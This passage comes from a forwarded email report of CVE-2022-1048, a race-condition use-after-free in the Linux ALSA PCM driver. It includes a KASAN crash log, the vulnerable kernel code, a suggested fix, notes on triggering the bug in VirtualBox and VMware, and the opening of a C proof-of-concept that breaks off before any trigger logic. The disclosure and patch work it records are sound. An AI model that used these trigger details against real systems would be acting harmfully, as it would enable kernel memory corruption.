[ 141.594686] ffff8880b34c9500: 00 00 00 00 00 00 fc fc fc fc fc fc fc fc
fc fc

[ 141.594688]
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

[ 141.594690] Disabling lock debugging due to kernel taint

[ 141.594692] R10: 00007fab6fab39d0 R11: 0000000000000246 R12:
00007fab6fab2e80

[ 141.594693] R13: 0000000000000000 R14: 0000000000000000 R15:
00007ffe52234d70

[ 141.594699] ------------[ cut here ]------------

[ 141.594700] pm_qos_remove_request() called for unknown object

[ 141.594706] snd-malloc: invalid device type 0

[ 141.594709] ------------[ cut here ]------------

[ 141.594710] pm_qos_remove_request() called for unknown object

[ 141.594716] WARNING: CPU: 2 PID: 1948 at kernel/power/qos.c:477
pm_qos_remove_request+0x204/0x2c0

[ 141.594719] WARNING: CPU: 1 PID: 1956 at kernel/power/qos.c:477
pm_qos_remove_request+0x204/0x2c0

[ 141.594720] Modules linked in:

[ 141.594721] Modules linked in:

[ 141.594721] nls_iso8859_1 intel_rapl_msr

[ 141.594723] nls_iso8859_1

[ 141.594724] snd_intel8x0 snd_ac97_codec

[ 141.594726] intel_rapl_msr

[ 141.594727] ac97_bus snd_pcm

[ 141.594728] snd_intel8x0

[ 141.594729] snd_seq_midi

[ 141.594730] snd_ac97_codec

[ 141.594731] snd_seq_midi_event

[ 141.594732] ac97_bus

[ 141.594733] snd_rawmidi snd_seq

[ 141.594735] snd_pcm

[ 141.594736] intel_rapl_common

[ 141.594737] snd_seq_midi

[ 141.594738] crct10dif_pclmul ghash_clmulni_intel

[ 141.594740] snd_seq_midi_event

[ 141.594740] snd_seq_device joydev

[ 141.594742] snd_rawmidi

[ 141.594743] cryptd

[ 141.594744] snd_seq

[ 141.594745] snd_timer rapl

[ 141.594747] intel_rapl_common

[ 141.594748] input_leds serio_raw

[ 141.594749] crct10dif_pclmul

[ 141.594750] snd vboxguest

[ 141.594752] ghash_clmulni_intel

[ 141.594753] soundcore

[ 141.594754] snd_seq_device

[ 141.594755] mac_hid sch_fq_codel

[ 141.594756] joydev

[ 141.594757] vmwgfx

[ 141.594758] cryptd

[ 141.594759] ttm drm_kms_helper

[ 141.594761] snd_timer

[ 141.594762] fb_sys_fops syscopyarea

[ 141.594763] rapl

[ 141.594764] sysfillrect sysimgblt

[ 141.594766] input_leds

[ 141.594767] drm parport_pc

[ 141.594768] serio_raw

[ 141.594769] ppdev

[ 141.594770] snd

[ 141.594771] lp parport

[ 141.594773] vboxguest

[ 141.594774] ip_tables x_tables

[ 141.594775] soundcore

[ 141.594776] autofs4 hid_generic

[ 141.594778] mac_hid

[ 141.594779] usbhid hid

[ 141.594780] sch_fq_codel

[ 141.594781] psmouse crc32_pclmul

[ 141.594783] vmwgfx

[ 141.594784] ahci libahci

[ 141.594785] ttm

[ 141.594786] e1000 i2c_piix4

[ 141.594788] drm_kms_helper

[ 141.594818] pata_acpi video

[ 141.594821] fb_sys_fops

[ 141.594823] syscopyarea sysfillrect

[ 141.594826] CPU: 1 PID: 1956 Comm: exp Tainted: G B 5.4.166 #1

[ 141.594827] sysimgblt drm parport_pc

[ 141.594830] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS
VirtualBox 12/01/2006

[ 141.594830] ppdev lp parport

[ 141.594835] RIP: 0010:pm_qos_remove_request+0x204/0x2c0

[ 141.594836] ip_tables x_tables autofs4

[ 141.594839] Code: 48 c1 ea 03 0f b6 04 02 84 c0 74 08 3c 03 0f 8e 9c 00
00 00 4d 63 6c 24 28 e9 8d fe ff ff 48 c7 c7 e0 44 4d ba e8 7f 10 f1 01
<0f> 0b 5b 41 5c 41 5d 41 5e 41 5f 5d c3 48 b8 00 00 00 00 00 fc ff

[ 141.594840] hid_generic usbhid hid

[ 141.594843] RSP: 0018:ffff8880b366fbb8 EFLAGS: 00010282

[ 141.594844] psmouse crc32_pclmul

[ 141.594846] ahci libahci e1000

[ 141.594849] RAX: 0000000000000000 RBX: ffffffffc0b416e0 RCX:
0000000000000000

[ 141.594849] i2c_piix4 pata_acpi video

[ 141.594852] RDX: 0000000000000001 RSI: 0000000000000008 RDI:
ffffed10166cdf69

[ 141.594854] RBP: ffff8880b366fbe0 R08: 0000000000000001 R09:
ffffed10193d551b

[ 141.594857] CPU: 2 PID: 1948 Comm: exp Tainted: G B 5.4.166 #1

[ 141.594858] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS
VirtualBox 12/01/2006

[ 141.594859] R10: ffffed10193d551a R11: ffff8880c9eaa8d7 R12:
ffff888035191440

[ 141.594861] R13: ffff888035191594 R14: ffff888035191400 R15:
ffff888035191468

[ 141.594863] RIP: 0010:pm_qos_remove_request+0x204/0x2c0

[ 141.594866] Code: 48 c1 ea 03 0f b6 04 02 84 c0 74 08 3c 03 0f 8e 9c 00
00 00 4d 63 6c 24 28 e9 8d fe ff ff 48 c7 c7 e0 44 4d ba e8 7f 10 f1 01
<0f> 0b 5b 41 5c 41 5d 41 5e 41 5f 5d c3 48 b8 00 00 00 00 00 fc ff

[ 141.594868] FS: 00007fab6baab700(0000) GS:ffff8880c9e80000(0000)
knlGS:0000000000000000

[ 141.594869] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033

[ 141.594871] RSP: 0018:ffff88809d6ffbb8 EFLAGS: 00010282

[ 141.594873] CR2: 00007fab66aa0e78 CR3: 000000004d344005 CR4:
00000000000606e0

[ 141.594874] RAX: 0000000000000000 RBX: ffffffffc0b416e0 RCX:
0000000000000000

[ 141.594876] RDX: 0000000000000001 RSI: 0000000000000008 RDI:
ffffed1013adff69

[ 141.594878] RBP: ffff88809d6ffbe0 R08: 0000000000000001 R09:
ffffed10193e551b

[ 141.594879] DR0: 0000000000000000 DR1: 0000000000000000 DR2:
0000000000000000

[ 141.594881] R10: ffffed10193e551a R11: ffff8880c9f2a8d7 R12:
ffff888035191440

[ 141.594882] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7:
0000000000000400

[ 141.594884] R13: ffff888035191594 R14: ffff888035191400 R15:
ffff888035191468

[ 141.594885] Call Trace:

[ 141.594888] FS: 00007fab6fab3700(0000) GS:ffff8880c9f00000(0000)
knlGS:0000000000000000

[ 141.594894] snd_pcm_common_ioctl+0x5f2/0x1b00 [snd_pcm]

[ 141.594896] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033

[ 141.594901] ? snd_pcm_status_user+0x130/0x130 [snd_pcm]

[ 141.594903] CR2: 000055cff0604b28 CR3: 000000004d344002 CR4:
00000000000606e0

[ 141.594909] snd_pcm_ioctl+0x6d/0xb0 [snd_pcm]

[ 141.594911] DR0: 0000000000000000 DR1: 0000000000000000 DR2:
0000000000000000

[ 141.594913] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7:
0000000000000400

[ 141.594915] do_vfs_ioctl+0x9da/0x1020

[ 141.594916] Call Trace:

[ 141.594919] ? ioctl_preallocate+0x1c0/0x1c0

[ 141.594922] ? __kasan_check_write+0x14/0x20

[ 141.594927] snd_pcm_common_ioctl+0x5f2/0x1b00 [snd_pcm]

[ 141.594930] ? __fget+0x21c/0x3d0

[ 141.594935] ? snd_pcm_status_user+0x130/0x130 [snd_pcm]

[ 141.594939] ? copy_fd_bitmaps+0x2e0/0x2e0

[ 141.594944] snd_pcm_ioctl+0x6d/0xb0 [snd_pcm]

[ 141.594947] ? __switch_to_asm+0x40/0x70

[ 141.594949] do_vfs_ioctl+0x9da/0x1020

[ 141.594951] ? __switch_to_asm+0x34/0x70

[ 141.594953] ? ioctl_preallocate+0x1c0/0x1c0

[ 141.594955] ? __switch_to_asm+0x40/0x70

[ 141.594957] ? __kasan_check_write+0x14/0x20

[ 141.594960] ? __fget+0x21c/0x3d0

[ 141.594961] ? __switch_to_asm+0x34/0x70

[ 141.594965] ? __fget_light+0x17e/0x1f0

[ 141.594967] ? copy_fd_bitmaps+0x2e0/0x2e0

[ 141.594969] ? __switch_to_asm+0x40/0x70

[ 141.594971] ksys_ioctl+0x67/0x90

[ 141.594974] ? __switch_to_asm+0x34/0x70

[ 141.594976] __x64_sys_ioctl+0x73/0xb0

[ 141.594979] ? fpregs_assert_state_consistent+0x22/0xa0

[ 141.594980] ? __switch_to_asm+0x40/0x70

[ 141.594982] ? __switch_to_asm+0x34/0x70

[ 141.594985] do_syscall_64+0x9f/0x3c0

[ 141.594988] ? syscall_return_slowpath+0x1a5/0x220

[ 141.594990] ? __fget_light+0x17e/0x1f0

[ 141.594993] entry_SYSCALL_64_after_hwframe+0x44/0xa9

[ 141.594995] ksys_ioctl+0x67/0x90

[ 141.594998] RIP: 0033:0x4e68b7

[ 141.595000] __x64_sys_ioctl+0x73/0xb0

[ 141.595002] ? fpregs_assert_state_consistent+0x22/0xa0

[ 141.595004] Code: 4f 55 04 00 85 c0 78 df 48 83 c4 08 48 89 d8 5b 5d c3
90 48 89 e8 48 f7 d8 48 39 c3 0f 92 c0 eb b4 66 90 b8 10 00 00 00 0f 05
<48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48

[ 141.595006] RSP: 002b:00007fab6baaada8 EFLAGS: 00000246

[ 141.595008] do_syscall_64+0x9f/0x3c0

[ 141.595009] ORIG_RAX: 0000000000000010

[ 141.595011] RAX: ffffffffffffffda RBX: 0000000000000000 RCX:
00000000004e68b7

[ 141.595012] RDX: 0000000000000000 RSI: 0000000000004112 RDI:
0000000000000003

[ 141.595015] ? syscall_return_slowpath+0x1a5/0x220

[ 141.595017] RBP: 00007fab6baaadb0 R08: 00007fab6baab700 R09:
00007fab6baab700

[ 141.595019] entry_SYSCALL_64_after_hwframe+0x44/0xa9

[ 141.595021] RIP: 0033:0x4e68b7

[ 141.595022] R10: 00007fab6baab9d0 R11: 0000000000000246 R12:
00007fab6baaae80

[ 141.595024] R13: 0000000000000000 R14: 0000000000000000 R15:
00007ffe52234d70

[ 141.595026] Code: 4f 55 04 00 85 c0 78 df 48 83 c4 08 48 89 d8 5b 5d c3
90 48 89 e8 48 f7 d8 48 39 c3 0f 92 c0 eb b4 66 90 b8 10 00 00 00 0f 05
<48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48

[ 141.595027] RSP: 002b:00007fab6fab2da8 EFLAGS: 00000246 ORIG_RAX:
0000000000000010

[ 141.595030] RAX: ffffffffffffffda RBX: 0000000000000000 RCX:
00000000004e68b7

[ 141.595031] ---[ end trace 86992d9d3bd66364 ]---

[ 141.595033] RDX: 0000000000000000 RSI: 0000000000004112 RDI:
0000000000000003

[ 141.595035] RBP: 00007fab6fab2db0 R08: 00007fab6fab3700 R09:
00007fab6fab3700

[ 141.595037] R10: 00007fab6fab39d0 R11: 0000000000000246 R12:
00007fab6fab2e80

[ 141.595038] R13: 0000000000000000 R14: 0000000000000000 R15:
00007ffe52234d70

[ 141.595043] ---[ end trace 86992d9d3bd66365 ]---

```

--000000000000f2ac1e05db47d2ca
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr">This is the original report about CVE-2022-1048.<div><br><=
div>Patch:=C2=A0<a href=3D"https://lore.kernel.org/all/20220322170720.3529-=
1-tiwai@suse.de/#t">https://lore.kernel.org/all/20220322170720.3529-1-tiwai=
@suse.de/#t</a></div><div><br><br><div class=3D"gmail_quote"><div dir=3D"lt=
r" class=3D"gmail_attr">---------- Forwarded message ---------<br>=E5=8F=91=
=E4=BB=B6=E4=BA=BA=EF=BC=9A <strong class=3D"gmail_sendername" dir=3D"auto"=
>Hu Jiahui</strong> <span dir=3D"auto">&lt;<a href=3D"mailto:kirin.say@gmai=
l.com" target=3D"_blank">kirin.say@gmail.com</a>&gt;</span><br>Date: 2022=
=E5=B9=B43=E6=9C=8820=E6=97=A5=E5=91=A8=E6=97=A5 22:22<br>Subject: [vs] Lin=
ux Kernel: Race Condition in snd_pcm_hw_free leading to use-after-free<br>T=
o:  &lt;<a href=3D"mailto:security@kernel.org" target=3D"_blank">security@k=
ernel.org</a>&gt;,  &lt;<a href=3D"mailto:linux-distros@vs.openwall.org" ta=
rget=3D"_blank">linux-distros@vs.openwall.org</a>&gt;<br></div><br><br><div=
 dir=3D"ltr"><p style=3D"margin:0px;white-space:pre-wrap"># Linux Kernel: R=
ace Condition in snd_pcm_hw_free leading to use-after-free</p><p style=3D"m=
argin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">## Details</p><p style=3D"marg=
in:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">In the path: snd_pcm_common_io=
ctl -&gt; snd_pcm_hw_free:</p><p style=3D"margin:0px;white-space:pre-wrap">=
<br></p>
<p style=3D"margin:0px;white-space:pre-wrap">```c</p>
<p style=3D"margin:0px;white-space:pre-wrap">static int snd_pcm_hw_free(str=
uct snd_pcm_substream *substream)</p>
<p style=3D"margin:0px;white-space:pre-wrap">{</p>
<p style=3D"margin:0px;white-space:pre-wrap">	struct snd_pcm_runtime *runti=
me;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	int result;</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">	if (PCM_RUNTIME_CHECK(substre=
am))</p>
<p style=3D"margin:0px;white-space:pre-wrap">		return -ENXIO;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	runtime =3D substream-&gt;run=
time;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	snd_pcm_stream_lock_irq(subst=
ream);</p>
<p style=3D"margin:0px;white-space:pre-wrap">	switch (runtime-&gt;status-&g=
t;state) {</p>
<p style=3D"margin:0px;white-space:pre-wrap">	case SNDRV_PCM_STATE_SETUP:</=
p>
<p style=3D"margin:0px;white-space:pre-wrap">	case SNDRV_PCM_STATE_PREPARED=
:</p>
<p style=3D"margin:0px;white-space:pre-wrap">		break;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	default:</p>
<p style=3D"margin:0px;white-space:pre-wrap">		snd_pcm_stream_unlock_irq(su=
bstream);</p>
<p style=3D"margin:0px;white-space:pre-wrap">		return -EBADFD;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	}</p>
<p style=3D"margin:0px;white-space:pre-wrap">	snd_pcm_stream_unlock_irq(sub=
stream);</p>
<p style=3D"margin:0px;white-space:pre-wrap">	if (atomic_read(&amp;substrea=
m-&gt;mmap_count))</p>
<p style=3D"margin:0px;white-space:pre-wrap">		return -EBADFD;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	result =3D do_hw_free(substre=
am);</p>
<p style=3D"margin:0px;white-space:pre-wrap">	snd_pcm_set_state(substream, =
SNDRV_PCM_STATE_OPEN);</p>
<p style=3D"margin:0px;white-space:pre-wrap">	cpu_latency_qos_remove_reques=
t(&amp;substream-&gt;latency_pm_qos_req);</p>
<p style=3D"margin:0px;white-space:pre-wrap">	return result;</p>
<p style=3D"margin:0px;white-space:pre-wrap">}</p>
<p style=3D"margin:0px;white-space:pre-wrap">```</p>
<p style=3D"margin:0px;white-space:pre-wrap">It seems like that the functio=
n calls the unlock too early, this may lead to a race condition in the foll=
owing code. </p>
<p style=3D"margin:0px;white-space:pre-wrap">And if two threads call do_hw_=
free-&gt;snd_pcm_lib_free_pages at the same time:</p>
<p style=3D"margin:0px;white-space:pre-wrap">```</p>
<p style=3D"margin:0px;white-space:pre-wrap">int snd_pcm_lib_free_pages(str=
uct snd_pcm_substream *substream)</p>
<p style=3D"margin:0px;white-space:pre-wrap">{</p>
<p style=3D"margin:0px;white-space:pre-wrap">	struct snd_card *card =3D sub=
stream-&gt;pcm-&gt;card;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	struct snd_pcm_runtime *runti=
me;</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">	if (PCM_RUNTIME_CHECK(substre=
am))</p>
<p style=3D"margin:0px;white-space:pre-wrap">		return -EINVAL;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	runtime =3D substream-&gt;run=
time;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	if (runtime-&gt;dma_area =3D=
=3D NULL)</p>
<p style=3D"margin:0px;white-space:pre-wrap">		return 0;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	if (runtime-&gt;dma_buffer_p =
!=3D &amp;substream-&gt;dma_buffer) {    //  ******** 1 ********</p>
<p style=3D"margin:0px;white-space:pre-wrap">		/* it&#39;s a newly allocate=
d buffer.  release it now. */</p>
<p style=3D"margin:0px;white-space:pre-wrap">		do_free_pages(card, runtime-=
&gt;dma_buffer_p);</p>
<p style=3D"margin:0px;white-space:pre-wrap">		kfree(runtime-&gt;dma_buffer=
_p);      //  ******** 2 ********</p>
<p style=3D"margin:0px;white-space:pre-wrap">	}</p>
<p style=3D"margin:0px;white-space:pre-wrap">	snd_pcm_set_runtime_buffer(su=
bstream, NULL);</p>
<p style=3D"margin:0px;white-space:pre-wrap">	return 0;</p>
<p style=3D"margin:0px;white-space:pre-wrap">}</p>
<p style=3D"margin:0px;white-space:pre-wrap">```</p>
<p style=3D"margin:0px;white-space:pre-wrap">=3D&gt; It will lead to a use-=
after-free(double free) issue in the kernel.</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">## Suggestion</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">Add a lock to the snd_pcm_hw_f=
ree and unlock it when return.</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">## POC</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">To trigger this vulnerability =
at (2), the poc should bypass the check in snd_pcm_lib_free_pages:(1). Actu=
ally, whether to apply for new memory here is related to the sound driver u=
sed in the system.</p>
<p style=3D"margin:0px;white-space:pre-wrap">If we add a virtual machine in=
 VirtualBox with Ubuntu. The default sound driver is intel8x0, and in this =
driver we can alloc a new buffer and bypass the check in (1) easily.</p>
<p style=3D"margin:0px;white-space:pre-wrap">(But in the Vmware, the driver=
 has requested the maximum memory size in advance. To trigger the vulnerabi=
lity, we must write the &quot;/proc/xxx/xxx/prealloc&quot; file in sound ca=
rd to force the driver to apply for a smaller buffer(in function snd_pcm_li=
b_preallocate_proc_write) so that we can alloc a new buffer in snd_pcm_lib_=
malloc_pages later.)</p><p style=3D"margin:0px;white-space:pre-wrap"><br></=
p>
<p style=3D"margin:0px;white-space:pre-wrap">**The POC:**</p><p style=3D"ma=
rgin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">```</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;stdio.h&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;stdlib.h&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &quot;alsa/asoundlib.=
h&quot;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;stdbool.h&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;sys/socket.h&gt;<=
/p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;sys/msg.h&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;sys/mman.h&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;sys/wait.h&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;unistd.h&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;string.h&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;stdlib.h&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;arpa/inet.h&gt;</=
p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;sys/stat.h&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;fcntl.h&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;sched.h&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;sys/ioctl.h&gt;</=
p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;sys/types.h&gt;</=
p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;stdio.h&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;sys/ipc.h&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;sys/msg.h&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;sys/socket.h&gt;<=
/p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;sys/syscall.h&gt;=
</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;linux/if_packet.h=
&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;linux/if_ether.h&=
gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;linux/if_arp.h&gt=
;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;sys/socket.h&gt;<=
/p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;sys/syscall.h&gt;=
</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;linux/if_packet.h=
&gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;linux/if_ether.h&=
gt;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#include &lt;linux/if_arp.h&gt=
;</p>
<p style=3D"margin:0px;white-space:pre-wrap">typedef unsigned int __u32;</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_ACC=
ESS	0	/* Access type */</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_FOR=
MAT	1	/* Format */</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_SUB=
FORMAT	2	/* Subformat */</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_FIR=
ST_MASK	SNDRV_PCM_HW_PARAM_ACCESS</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_LAS=
T_MASK	SNDRV_PCM_HW_PARAM_SUBFORMAT</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_SAM=
PLE_BITS	8	/* Bits per sample */</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_FRA=
ME_BITS	9	/* Bits per frame */</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_CHA=
NNELS	10	/* Channels */</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_RAT=
E		11	/* Approx rate */</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_PER=
IOD_TIME	12	/* Approx distance between</p>
<p style=3D"margin:0px;white-space:pre-wrap">						 * interrupts in us</p>
<p style=3D"margin:0px;white-space:pre-wrap">						 */</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_PER=
IOD_SIZE	13	/* Approx frames between</p>
<p style=3D"margin:0px;white-space:pre-wrap">						 * interrupts</p>
<p style=3D"margin:0px;white-space:pre-wrap">						 */</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_PER=
IOD_BYTES	14	/* Approx bytes between</p>
<p style=3D"margin:0px;white-space:pre-wrap">						 * interrupts</p>
<p style=3D"margin:0px;white-space:pre-wrap">						 */</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_PER=
IODS	15	/* Approx interrupts per</p>
<p style=3D"margin:0px;white-space:pre-wrap">						 * buffer</p>
<p style=3D"margin:0px;white-space:pre-wrap">						 */</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_BUF=
FER_TIME	16	/* Approx duration of buffer</p>
<p style=3D"margin:0px;white-space:pre-wrap">						 * in us</p>
<p style=3D"margin:0px;white-space:pre-wrap">						 */</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_BUF=
FER_SIZE	17	/* Size of buffer in frames */</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_BUF=
FER_BYTES	18	/* Size of buffer in bytes */</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_TIC=
K_TIME	19	/* Approx tick duration in us */</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_FIR=
ST_INTERVAL	SNDRV_PCM_HW_PARAM_SAMPLE_BITS</p>
<p style=3D"margin:0px;white-space:pre-wrap">#define	SNDRV_PCM_HW_PARAM_LAS=
T_INTERVAL	SNDRV_PCM_HW_PARAM_TICK_TIME</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">struct snd_interval {</p>
<p style=3D"margin:0px;white-space:pre-wrap">	unsigned int min, max;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	unsigned int openmin:1,</p>
<p style=3D"margin:0px;white-space:pre-wrap">		     openmax:1,</p>
<p style=3D"margin:0px;white-space:pre-wrap">		     integer:1,</p>
<p style=3D"margin:0px;white-space:pre-wrap">		     empty:1;</p>
<p style=3D"margin:0px;white-space:pre-wrap">};</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">#define SNDRV_MASK_MAX	256</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">struct snd_mask {</p>
<p style=3D"margin:0px;white-space:pre-wrap">	__u32 bits[(SNDRV_MASK_MAX+31=
)/32];</p>
<p style=3D"margin:0px;white-space:pre-wrap">};</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">typedef struct {</p>
<p style=3D"margin:0px;white-space:pre-wrap">	int version;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	int fd;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	int card, device, subdevice;<=
/p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">	volatile struct snd_pcm_mmap_=
status * mmap_status;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	struct snd_pcm_mmap_control *=
mmap_control;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	bool mmap_status_fallbacked;<=
/p>
<p style=3D"margin:0px;white-space:pre-wrap">	bool mmap_control_fallbacked;=
</p>
<p style=3D"margin:0px;white-space:pre-wrap">	struct snd_pcm_sync_ptr *sync=
_ptr;</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">	int period_event;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	snd_timer_t *period_timer;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	struct pollfd period_timer_pf=
d;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	int period_timer_need_poll;</=
p>
<p style=3D"margin:0px;white-space:pre-wrap">	/* restricted parameters */</=
p>
<p style=3D"margin:0px;white-space:pre-wrap">	snd_pcm_format_t format;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	int rate;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	int channels;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	/* for chmap */</p>
<p style=3D"margin:0px;white-space:pre-wrap">	unsigned int chmap_caps;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	snd_pcm_chmap_query_t **chmap=
_override;</p>
<p style=3D"margin:0px;white-space:pre-wrap">} snd_pcm_hw_t;</p>
<p style=3D"margin:0px;white-space:pre-wrap"><br></p>
<p style=3D"margin:0px;white-space:pre-wrap">struct snd_pcm_hw_params {</p>
<p style=3D"margin:0px;white-space:pre-wrap">	unsigned int flags;</p>
<p style=3D"margin:0px;white-space:pre-wrap">	struct snd_mask masks[SNDRV_P=
CM_HW_PARAM_LAST_MASK -</p>
<p style=3D"margin:0px;white-space:pre-wrap">			       SNDRV_PCM_HW_PARAM_F=
IRST_MASK + 1];</p>
<p style=3D"margin:0px;white-space:pre-wrap">	struct snd_mask mres[5];	/* r=
eserved masks */</p>
<p style=3D"margin:0px;white-space:pre-wrap">	struct snd_interval intervals=
[SNDRV_PCM_HW_PARAM_LAST_INTERVAL -</p>
<p style=3D"margin:0px;white-space:pre-wrap">				        SNDRV_PCM_HW_PARAM=
_FIRST_INTERVAL + 1];</p>
<p style=3D"margin:0px;white-space:pre-wrap">	struct snd_interval ires[9];	=
/* reserved intervals */</p>
<p style=3D"margin:0px;white-space:pre-wrap">	unsigned int rmask;		/* W: re=
quested masks */</p>
<p style=3D"margin:0px;white-space:pre-wrap">	unsigned int cmask;		/* R: ch=
anged masks */</p>
<p style=3D"margin:0px;white-space:pre-wrap">	unsigned int info;		/* R: Inf=
o flags for returned setup */</p>
